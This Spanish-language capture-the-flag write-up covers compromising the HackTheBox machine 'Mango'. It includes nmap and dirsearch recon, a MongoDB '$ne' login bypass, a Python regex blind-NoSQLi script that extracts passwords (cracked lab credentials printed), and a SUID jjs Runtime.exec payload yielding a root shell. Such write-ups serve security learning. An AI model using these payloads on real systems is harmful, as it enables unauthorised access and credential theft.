---
title: "HTB write-up: Mango"
date: 2020-04-16T17:26:12-05:00
toc: false
images:
tags: 
  - hackthebox
  - pentesting
  - boot2root
  - mongodb
  - jjs
  - nosqli
---

Mango de hackthebox es una máquina que realmente disfrute resolver. Tiene de todo lo que un buen cocktail debe llevar: hielo, mongo nosqli y un chingo de tequila. Iniciamos la máquina por una enumeración de vhosts, continuamos por un nosqli en mango, obtenemos credenciales, accedemos a la máquina, nos movemos a otro usuario, y para la escalación de privilegios a root, usamos una herramienta que interactúa con el motor de scripts Nashorn.

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![mango image](https://www.hackthebox.eu/storage/avatars/3609b9c723930cd9b1f855d18e92032b_thumb.png) [mango](https://www.hackthebox.eu/home/machines/profile/214) | [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) | Linux | 10.10.10.162 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-mango/cardinfo.png)

# Port Scanning and Service Discovery

Iniciamos por ejecutar un `masscan` para descubrir puertos udp y tcp abiertos, y posteriormente `nmap`, para identificar servicios expuestos en estos puertos.

## masscan

``` text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.162 | tee /home/tony/htb/mango/masscan.log
Discovered open port 22/tcp on 10.10.10.162                                    
Discovered open port 80/tcp on 10.10.10.162                                    
Discovered open port 443/tcp on 10.10.10.162                                   
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Descubrimos 3 puertos abiertos; 22, 80 y 443. Ahora con `nmap`, identifiquemos los servicios.

## nmap services

``` text
root@laptop:~# nmap -sS -sV -sC -p $(cat /home/tony/htb/mango/masscan.log | cut -d' ' -f4 | sed 's/\/tcp.*//' | tr '\n' ',') -n --open -v 10.10.10.162 -oN /home/tony/htb/mango/service.nmap
# Nmap 7.80 scan initiated Thu Mar 26 15:24:16 2020 as: nmap -sS -sV -sC -p 22,80,443, -n --open -v -oN /home/tony/htb/mango/service.nmap 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.095s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after:  2020-09-26T14:21:19
| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 26 15:24:35 2020 -- 1 IP address (1 host up) scanned in 19.04 seconds
```

- `-sS` para seleccionar el escaneo TCP vía SYN
- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p 22,80,443` para escanear solo los puertos TCP 80 y 22
- `-oN` para guardar el output en formato normal o salida por defecto de nmap
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Encontramos los servicios de SSH, HTTP, HTTPS en sus puertos por defecto. Por los banners podemos deducir de momento que se trata de un servidor Ubuntu corriendo openssh 7.6p1 y apache 2.4.29. La parte interesante de este escaneo fue identificar el commonName del certificado. Llegaremos a este dato más adelante, pero la primera vez que lo vi, no le preste tanta importancia.

# Web application

## httpie

Inicio la exploración de la aplicación usando httpie y firefox+burpsuite. En algunas partes estaré utilizando httpie+burpsuite por la flexibilidad de poder usar bash.

``` text
tony@laptop:~/htb/mango$ http 10.10.10.162
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.162 Port 80</address>
</body></html>
```

En el root del servidor tenemos un *403*, así que continuemos con la búsqueda de archivos y directorios con dirsearch.

## dirsearch

``` text
tony@laptop:~/htb/mango$ dirsearch http://10.10.10.162
 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: get | Threads: 50 | Wordlist size: 6733

Error Log: /home/tony/git/dirsearch/logs/errors-20-03-27_18-54-26.log

Target: http://10.10.10.162

[18:54:26] Starting:
[18:55:12] 403 -  277B  - /server-status
[18:55:12] 403 -  277B  - /server-status/

Task Completed
```

El resultado que `dirsearch` nos devuelve sobre el puerto HTTP es poco significativo, así que continuemos por el puerto de HTTPS, primero indagando en el certificado.

## testssl

``` text
tony@laptop:~/htb/mango$ testssl 10.10.10.162
 Testing server defaults (Server Hello)

 TLS extensions (standard)    "renegotiation info/#65281" "EC point formats/#11" "session ticket/#35" "max fragment length/#1"
                              "application layer protocol negotiation/#16" "encrypt-then-mac/#22" "extended master secret/#23"
 Session Ticket RFC 5077 hint 300 seconds, session tickets keys seems to be rotated < daily
 SSL Session ID support       yes
 Session Resumption           Tickets: yes, ID: yes
 TLS clock skew               Random values, no fingerprinting possible
 Signature Algorithm          SHA256 with RSA
 Server key size              RSA 2048 bits
 Server key usage             --
 Server extended key usage    --
 Serial / Fingerprints        AE508929A806F132 / SHA1 B3299ECA2892AF1B5895053BF30E861F1C03DB95
                              SHA256 650052B67923042DC2C9FCA71D4430873615850CE4D41E15A4BD7F5CFB57AA58
 Common Name (CN)             staging-order.mango.htb
 subjectAltName (SAN)         missing (NOT ok) -- Browsers are complaining
 Issuer                       staging-order.mango.htb (Mango Prv Ltd. from IN)
 Trust (hostname)             certificate does not match supplied URI
 Chain of trust               NOT ok (self signed)
 EV cert (experimental)       no
 ETS/"eTLS", visibility info  not present
 Certificate Validity (UTC)   182 >= 60 days (2019-09-27 09:21 --> 2020-09-26 09:21)
 # of certificates provided   1
 Certificate Revocation List  --
 OCSP URI                     --
                              NOT ok -- neither CRL nor OCSP URI provided
 OCSP stapling                not offered
 OCSP must staple extension   --
 DNS CAA RR (experimental)    not offered
 Certificate Transparency     --
```

La salida de testssl es bastante extensa, así que omití información y deje únicamente lo relevante para esta máquina. Lo que sacamos de esta primera parte es que el certificado fue firmado para el dominio staging-order.mango.htb. Esta información coincide con la encontrada en el nmap, pero hasta que no hice la prueba con testssl, no cruce los conceptos de vhosts para esta máquina.

Realizando un request con httpie y usando el header de Host, obtenemos la siguiente salida:

``` text
tony@laptop:~/htb/mango$ http http://10.10.10.162 "Host:staging-order.mango.htb"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<link rel="mask-icon" type="" href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111" />
<title>Mango | Sweet & Juicy</title>
<style>
* {
  box-sizing: border-box;
}

body {
  font-family: 'Rubik', sans-serif;
  margin: 0;
  padding: 0;
}

.container {
  display: flex;
  height: 100vh;
}

.left-section {
  overflow: hidden;
  display: flex;
  flex-wrap: wrap;
  flex-direction: column;
  justify-content: center;
  -webkit-animation-name: left-section;
  animation-name: left-section;
  -webkit-animation-duration: 1s;
  animation-duration: 1s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
  -webkit-animation-delay: 1s;
  animation-delay: 1s;
}

.right-section {
  flex: 1;
  background: linear-gradient(to right, #f50629 0%, #fd9d08 100%);
  transition: 1s;
  background-image: url(/mango.jpg);
  background-size: cover;
  background-repeat: no-repeat;
  background-position: center;
}

.header > h1 {
  margin: 0;
  color: #f50629;
}

.header > h4 {
  margin-top: 10px;
  font-weight: normal;
  font-size: 15px;
  color: rgba(0, 0, 0, 0.4);
}

.form {
  max-width: 80%;
  display: flex;
  flex-direction: column;
}

.form > p {
  text-align: right;
}

.form > p > a {
  color: #000;
  font-size: 14px;
}

.form-field {
  height: 46px;
  padding: 0 16px;
  border: 2px solid #ddd;
  border-radius: 4px;
  font-family: 'Rubik', sans-serif;
  outline: 0;
  transition: .2s;
  margin-top: 20px;
}

.form-field:focus {
  border-color: #0f7ef1;
}

.form > button {
  padding: 12px 10px;
  border: 0;
  background: linear-gradient(to right, #f50629 0%, #fd9d08 100%);
  border-radius: 3px;
  margin-top: 10px;
  color: #fff;
  letter-spacing: 1px;
  font-family: 'Rubik', sans-serif;
}

.animation {
  -webkit-animation-name: move;
  animation-name: move;
  -webkit-animation-duration: .4s;
  animation-duration: .4s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
  -webkit-animation-delay: 2s;
  animation-delay: 2s;
}

.a1 {
  -webkit-animation-delay: 2s;
  animation-delay: 2s;
}

.a2 {
  -webkit-animation-delay: 2.1s;
  animation-delay: 2.1s;
}

.a3 {
  -webkit-animation-delay: 2.2s;
  animation-delay: 2.2s;
}

.a4 {
  -webkit-animation-delay: 2.3s;
  animation-delay: 2.3s;
}

.a5 {
  -webkit-animation-delay: 2.4s;
  animation-delay: 2.4s;
}

.a6 {
  -webkit-animation-delay: 2.5s;
  animation-delay: 2.5s;
}

@keyframes move {
  0% {
    opacity: 0;
    visibility: hidden;
    -webkit-transform: translateY(-40px);
    transform: translateY(-40px);
  }
  100% {
    opacity: 1;
    visibility: visible;
    -webkit-transform: translateY(0);
    transform: translateY(0);
  }
}
@keyframes left-section {
  0% {
    opacity: 0;
    width: 0;
  }
  100% {
    opacity: 1;
    padding: 20px 40px;
    width: 440px;
  }
}

  </style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
<div class="left-section">
<div class="header">
<h1 class="animation a1">Welcome Back!</h1>
<h4 class="animation a2">Log in for ordering Sweet & Juicy Mango.</h4>
</div>
<form action="" method="POST">
<div class="form">
<input type="username" name="username" class="form-field animation a3" placeholder="Username">
<input type="password" name="password" class="form-field animation a4" placeholder="Password">
<p class="animation a5"><a href="#">Forgot Password</a></p>
<button class="animation a6" value="login" name="login">LOGIN</button>
</form>
</div>
</div>
<div class="right-section"></div>
</div>
</body>
</html>
</body>
</html>
```

Nice, ahora ya tenemos información sobre un portal para ordenar dulce y jugoso mango. Ñam Ñam.

Ahora que sabemos que probablemente estaremos trabajando sobre este subdominio, lo primero que hacemos es agregar `10.10.10.162    staging-order.mango.htb` a `/etc/hosts`, de esta manera no tenemos que reescribir el header de Host en todas las peticiones.

Después de descubrir la aplicación, intente ingresar con credenciales por defecto, inclusive le hice un ataque de fuerza bruta, pero por supuesto, nada funciono. Probé haciendo un bypass con un SQLi y tampoco funciono. Aquí es donde volví a las notas y la metodología que estaba siguiendo y me dí cuenta que necesitaba volver a iniciar el proceso de descubrimiento. Así que repetimos el proceso de descubrir archivos y directorios con `dirsearch`.

> Siempre hay que enumerar de manera organizada, siguiendo una metodología.

## dirsearch on staging-order

``` text
tony@laptop:~/htb/mango$ dirsearch http://staging-order.mango.htb

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: get | Threads: 50 | Wordlist size: 6733

Error Log: /home/tony/git/dirsearch/logs/errors-20-04-02_23-54-40.log

Target: http://staging-order.mango.htb

[23:54:40] Starting:
[23:54:50] 302 -    0B  - /home.php  ->  index.php
[23:54:50] 200 -    4KB - /index.php
[23:54:50] 200 -    4KB - /index.php/login/
[23:54:55] 403 -  288B  - /server-status
[23:54:55] 403 -  288B  - /server-status/
[23:54:57] 200 -    0B  - /vendor/autoload.php
[23:54:57] 200 -    0B  - /vendor/composer/autoload_files.php
[23:54:57] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[23:54:57] 200 -    0B  - /vendor/composer/autoload_classmap.php
[23:54:57] 200 -    0B  - /vendor/composer/autoload_psr4.php
[23:54:57] 200 -    0B  - /vendor/composer/ClassLoader.php
[23:54:57] 200 -    0B  - /vendor/composer/autoload_real.php
[23:54:57] 200 -    4KB - /vendor/composer/installed.json
[23:54:57] 200 -    0B  - /vendor/composer/autoload_static.php
[23:54:57] 200 -    3KB - /vendor/composer/LICENSE
```

Descubrimos que la aplicación utiliza Composer (PHP) y que podemos leer más de un archivo del proyecto. Veamos que instaló composer vía **installed.json**:

``` text
tony@laptop:~/htb/mango$ http http://staging-order.mango.htb/vendor/composer/installed.json
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 3953
Content-Type: application/json
Date: Fri, 03 Apr 2020 05:57:05 GMT
ETag: "f71-5938a794b5495"
Keep-Alive: timeout=5, max=100
Last-Modified: Fri, 27 Sep 2019 15:23:53 GMT
Server: Apache/2.4.29 (Ubuntu)

[
    {
        "authors": [
            {
                "email": "alcaeus@alcaeus.org",
                "name": "alcaeus"
            },
            {
                "email": "olivier.lechevalier@gmail.com",
                "name": "Olivier Lechevalier"
            }
        ],
        "autoload": {
            "files": [
                "lib/Mongo/functions.php"
            ],
            "psr-0": {
                "Mongo": "lib/Mongo"
            },
            "psr-4": {
                "Alcaeus\\MongoDbAdapter\\": "lib/Alcaeus/MongoDbAdapter"
            }
        },
        "description": "Adapter to provide ext-mongo interface on top of mongo
        "dist": {
            "reference": "93b81ebef1b3a4d3ceb72f13a35057fe08a5048f",
            "shasum": "",
            "type": "zip",
            "url": "https://api.github.com/repos/alcaeus/mongo-php-adapter/zip
        },
        "extra": {
            "branch-alias": {
                "dev-master": "1.1.x-dev"
            }
        },
        "installation-source": "dist",
        "keywords": [
            "database",
            "mongodb"
        ],
        "license": [
            "MIT"
        ],
        "name": "alcaeus/mongo-php-adapter",
        "notification-url": "https://packagist.org/downloads/",
        "provide": {
            "ext-mongo": "1.6.14"
        },
        "require": {
            "ext-ctype": "*",
            "ext-hash": "*",
            "ext-mongodb": "^1.2.0",
            "mongodb/mongodb": "^1.0.1",
            "php": "^5.6 || ^7.0"
        },
        "require-dev": {
            "phpunit/phpunit": "^5.7.27 || ^6.0 || ^7.0",
            "squizlabs/php_codesniffer": "^3.2"
        },
        "source": {
            "reference": "93b81ebef1b3a4d3ceb72f13a35057fe08a5048f",
            "type": "git",
            "url": "https://github.com/alcaeus/mongo-php-adapter.git"
        },
        "time": "2019-08-07T05:52:28+00:00",
        "type": "library",
        "version": "1.1.9",
        "version_normalized": "1.1.9.0"
    },
    {
        "authors": [
            {
                "email": "jmikola@gmail.com",
                "name": "Jeremy Mikola"
            },
            {
                "email": "bjori@mongodb.com",
                "name": "Hannes Magnusson"
            },
            {
                "email": "github@derickrethans.nl",
                "name": "Derick Rethans"
            }
        ],
        "autoload": {
            "files": [
                "src/functions.php"
            ],
            "psr-4": {
                "MongoDB\\": "src/"
            }
        },
        "description": "MongoDB driver library",
        "dist": {
            "reference": "5cffeb33b893b6bb04195b99ddc3955a29252339",
            "shasum": "",
            "type": "zip",
            "url": "https://api.github.com/repos/mongodb/mongo-php-library/zip
        },
        "homepage": "https://jira.mongodb.org/browse/PHPLIB",
        "installation-source": "dist",
        "keywords": [
            "database",
            "driver",
            "mongodb",
            "persistence"
        ],
        "license": [
            "Apache-2.0"
        ],
        "name": "mongodb/mongodb",
        "notification-url": "https://packagist.org/downloads/",
        "require": {
            "ext-hash": "*",
            "ext-json": "*",
            "ext-mongodb": "^1.3.0",
            "php": ">=5.5"
        },
        "require-dev": {
            "phpunit/phpunit": "^4.8"
        },
        "source": {
            "reference": "5cffeb33b893b6bb04195b99ddc3955a29252339",
            "type": "git",
            "url": "https://github.com/mongodb/mongo-php-library.git"
        },
        "time": "2017-10-27T19:42:57+00:00",
        "type": "library",
        "version": "1.2.0",
        "version_normalized": "1.2.0.0"
    }
]

```

Aquí es cuando hice click. Mango-Mongo. La aplicación usa mongodb para la autenticación, por eso mis pruebas iniciales no funcionaron. Así que lo siguiente que hacemos es ir al payloadAllTheThings y revisar las notas sobre nosqli.

## Mongo NoSQLI

Entre las notas, hay una manera interesante de evaluar si la aplicación es susceptible a una inyección NOSQLi tipo blind; podemos efectuar una condición true al enviarle un "not equal" con un valor "no valido". Lo que buscamos con esta prueba, es un tipo de respuesta que indique un cambio en el code del response o en la cantidad de caracteres del reponse, así que tratemos de autenticarnos con el usuario y contraseña "miau":

``` text
tony@laptop:~/htb/mango$ http -f --proxy http:http://127.0.0.1:8080  POST http://staging-order.mango.htb/index.php 'username[$ne]=miau' 'password[$ne]=miau' login=login
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: close
Content-Length: 4022
Content-Type: text/html; charset=UTF-8
Date: Fri, 03 Apr 2020 05:41:25 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=ju8qscanv6umtk7mqhu7m4ekd8; path=/
location: home.php

```

La aplicación no encuentra fallas en mi lógica (miau no existe) y con esto nos pasamos por el arco del triunfo su validación. El 302 significa que hemos ingresado a la aplicación, nos da una cookie y nos manda a home.

> Una nota de importancia, el POST con x-www-form-urlencoded fue la parte que me dio dolores de cabeza en la siguiente parte, puesto que iba implícito en el request y fue me hizo perder tiempo ver que no obtenía CODE 302.

Al entrar a la aplicación vemos que dentro del body de `home.php`, hay un correo que nos dice sobre la existencia de un usuario admin; `admin@mango.htb`. Así que ahora vamos por este usuario.

## admin

Dentro de las notas de payloadAllTheThings, hay un script de como realizar un brute force en peticiones POST, que convenientemente modificamos para esta máquina.

``` python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

password=""
u="http://staging-order.mango.htb/index.php"
headers = {'application' : 'x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload={'username[$eq]':'admin', 'password[$regex]': '^%s' %(password + c), 'login': 'login' }
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

- Dejamos fijo el valor del usuario, en este caso **admin**.
- Lo único que necesitamos es un código de respuesta **302** para saber que la petición fue correcta.
- Dentro de los headers, necesitamos que nuestra petición POST tenga x-www-form-urlencoded para que el servidor la acepte.

Este brute forcer funciona gracias a las expresiones regulares, por que lo que realiza es preguntarle a la aplicación si la contraseña inicia con 'X', donde esto es un char imprimible y poco a poco, la aplicación le va contestando que "Si" conforme se le vuelve a preguntar (incremental). Cuando analice esto la primera vez, en mi cabeza se puso la imagen de: día de examen, el alumno preguntón que va y le pregunta al maestro si va bien y mal en 'X' parte. Se levanta una y otra vez a preguntarle al profesor. "Robo hormiga".

Al ejecutar el script tenemos lo siguiente:

``` text
tony@laptop:~/htb/mango$ python discover_admin.py
Found one more char : t
Found one more char : t9
Found one more char : t9K
Found one more char : t9Kc
Found one more char : t9KcS
Found one more char : t9KcS3
Found one more char : t9KcS3>
Found one more char : t9KcS3>!
Found one more char : t9KcS3>!0
Found one more char : t9KcS3>!0B
Found one more char : t9KcS3>!0B#
Found one more char : t9KcS3>!0B#2
Found one more char : t9KcS3>!0B#2$
Found one more char : t9KcS3>!0B#2$$
Found one more char : t9KcS3>!0B#2$$$
Found one more char : t9KcS3>!0B#2$$$$
Found one more char : t9KcS3>!0B#2$$$$$
Found one more char : t9KcS3>!0B#2$$$$$$
```

Continua *true* porque el inicio siempre es valido y porque no sabemos la longitud de la password.

> admin:t9KcS3\>!0B#2

Probamos las credenciales descubiertas para admin:

``` text
tony@laptop:~/htb/mango$ http --header -f --proxy http:http://127.0.0.1:8080  POST http://staging-order.mango.htb/index.php 'username=admin' 'password=t9KcS3>!0B#2' login=login
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: close
Content-Length: 4022
Content-Type: text/html; charset=UTF-8
Date: Fri, 03 Apr 2020 06:04:42 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=8mv78eer1d1dp7u84acl3ncscj; path=/
location: home.php

```

La respuesta es la esperada, así que podemos ir con burpsuite o firefox, y explorar la aplicación. 

Unos minutos después, me dí cuenta de que no había nada relevante en esta parte, así que trate de ingresar por SSH con estas credenciales pero no tuve éxito. Así fue que después de darle mas vueltas, dí un paso atrás y decidí buscar mas usuarios.

## cewl

Usamos cewl para tomar cualquier valor que nos pueda servir dentro de la aplicación, y con esto, creamos un diccionario con mayúsculas y minúsculas:

``` text
tony@laptop:~/htb/mango$ (cewl http://staging-order.mango.htb; cewl http://staging-order.mango.htb | tr '[:upper:]' '[:lower:]' ; cewl http://staging-order.mango.htb | tr '[:lower:]' '[:upper:]')  | grep -vi ninja | tee dict1.txt
Mango
Sweet
Juicy
Welcome
Back
Log
for
ordering
Forgot
Password
LOGIN
mango
sweet
juicy
welcome
back
log
for
ordering
forgot
password
login
MANGO
SWEET
JUICY
WELCOME
BACK
LOG
FOR
ORDERING
FORGOT
PASSWORD
LOGIN
```

Ahora usando `wfuzz` hacemos bruteforce de todos los posibles usuarios dentro del diccionario. Para la contraseña usamos una condición mayor a 1, aunque también hubiera funcionado con un "not equal":

``` text
tony@laptop:~/htb/mango$ wfuzz -w dict1.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://staging-order.mango.htb/index.php
Total requests: 33

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000012:   302        209 L    403 W    4022 Ch     "mango"

Total time: 0.520117
Processed Requests: 33
Filtered Requests: 32
Requests/sec.: 63.44717
```

Descubrimos al usuario mango, porque ya saben, "creatividad". Extendí el ataque con otro diccionario y busque más usuarios:

``` text
tony@laptop:~/htb/mango$ wfuzz -w ~/git/SecLists/Usernames/xato-net-10-million-usernames.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://staging-order.mango.htb/index.php
Total requests: 8295455

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   302        209 L    403 W    4022 Ch     "admin"
000003736:   302        209 L    403 W    4022 Ch     "mango"
^C
Finishing pending requests...
```

Después de un muchas búsquedas, cancele el bruteforce y continué con lo siguiente, bruteforce a la contraseña de mango.

## mango at mango.htb

Copie el archivo de `discover_admin.py`, modifique el usuario y lance el nuevo script `discover_mango.py`:

``` text
tony@laptop:~/htb/mango$ python discover_mango.py
Found one more char : h
Found one more char : h3
Found one more char : h3m
Found one more char : h3mX
Found one more char : h3mXK
Found one more char : h3mXK8
Found one more char : h3mXK8R
Found one more char : h3mXK8Rh
Found one more char : h3mXK8RhU
Found one more char : h3mXK8RhU~
Found one more char : h3mXK8RhU~f
Found one more char : h3mXK8RhU~f{
Found one more char : h3mXK8RhU~f{]
Found one more char : h3mXK8RhU~f{]f
Found one more char : h3mXK8RhU~f{]f5
Found one more char : h3mXK8RhU~f{]f5H
Found one more char : h3mXK8RhU~f{]f5H$
Found one more char : h3mXK8RhU~f{]f5H$$
Found one more char : h3mXK8RhU~f{]f5H$$$
```

Ahora tenemos otras credenciales mas.

> mango:h3mXK8RhU~f{]f5H

# from mango to admin

## ssh as mango

Ahora con estas nuevas credenciales, probé nuevamente el servicio SSH, esta vez, teniendo éxito:

``` text
tony@laptop:~$ ssh mango@10.10.10.162
mango@10.10.10.162's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr  3 06:26:43 UTC 2020

  System load:  0.82               Processes:            115
  Usage of /:   26.0% of 19.56GB   Users logged in:      1
  Memory usage: 29%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Apr  3 06:17:46 2020 from 10.10.14.3
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
```

Al fin, después de muchas vueltas y ciclos de CPU perdidos para siempre, ingresamos al servidor como _mango_. Leemos el archivo `/etc/passwd` y vemos a un viejo conocido, __admin__.

``` text
mango@mango:~$ tail /etc/passwd
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mango:x:1000:1000:mango:/home/mango:/bin/bash
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
```

Luego dije, ¿porque no pude acceder como admin, sera que son otras credenciales? 

Así que revise el archivo del servicio SSH:

``` text
mango@mango:~$ cat /etc/ssh/sshd_config  | grep -vE '^#|^$'
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp  /usr/lib/openssh/sftp-server
PasswordAuthentication yes
AllowUsers mango root
```

Pues con esto me quedo claro que solo mango o root podían acceder. Así que hice un switch con `su - admin`:

``` text
mango@mango:~$ su - admin
Password:
$
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home/admin$
```

Perfecto, ahora que somos admin, podemos tomar la bandera de user.

# user.txt

``` text
admin@mango:/home/admin$ cat user.txt
<omitido>
```

# From admin to root

## privesc

Ahora como admin y antes de lanzar un linenum, busque archivos donde admin fuera propietario o perteneciera al grupo:

``` text
admin@mango:/home/admin$ find /usr -user admin -type f 2>/dev/null
admin@mango:/home/admin$ find /usr -group admin -type f 2>/dev/null
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
admin@mango:/home/admin$ ls -lah /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-- 1 root admin 11K Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

El resultado es claro, tenemos SUID en este archivo, el cual root es owner y nosotros somos miembros del mismo grupo.

## SUID jjs

No tomo ni 2 minutos y gtfobins ya tenia una nota asociada.

``` text
https://gtfobins.github.io/gtfobins/jjs/#suid
```

Siguiendo la nota de gtfobins, y haciendo un par de cambios, preparamos el siguiente script para `jjs`

``` java
Java.type('java.lang.Runtime')
  .getRuntime()
    .exec('/bin/bash -pc $@|bash${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)')
      .waitFor()
```

Este exec es un tanto rebuscado e interesante, asi que por partes:

- `-p` aparece en todas partes, debido a que esto nos permite que al momento que hagamos nuestra invocación, las variables de root sean pasadas correctamente, como cuando hacemos un `su -` versus un `su`. Esto tiene relación entre el effective user (admin) y el real user (root). 
- `<$(tty) >$(tty) 2>$(tty)`, aquí básicamente lo que hacemos es conectarnos con la tty sobre la cual estamos trabajando, y redireccionamos tanto lo que sale como lo que entra (STDIN,STDOUT,STDERR). Esto nos servirá para que la salida sea la entrada del primer programa que conectamos a un pipe.
- `bash -pc`, se encarga de ejecutar el comando que recibe como argumento.
- `$@|bash${IFS}-p`, este se encarga de recibir un comando via el array de argumentos y ejecutarlo en bash por que lo recibe por el pipe. La variable ${IFS} es sustituida por un espacio dentro del string para concatenar el argumento `-p`.

